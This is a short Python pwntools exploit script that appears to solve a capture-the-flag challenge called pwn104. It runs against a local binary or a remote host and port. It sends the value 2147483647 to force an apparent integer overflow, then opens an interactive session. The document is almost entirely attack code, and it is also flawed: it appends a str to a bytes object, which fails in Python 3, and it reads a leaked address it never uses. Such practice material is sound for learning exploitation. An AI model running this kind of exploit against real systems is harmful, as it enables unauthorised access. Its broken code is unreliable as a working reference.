#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn104.pwn104'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)


io = start()
io.recvuntil(b'>> ') 
address = io.recvline() 

exploit  = b''
exploit += '2147483647'
io.sendline(exploit)
io.recvuntil(b'>> ') 
address = io.recvline() 
io.sendline('1')

io.interactive()
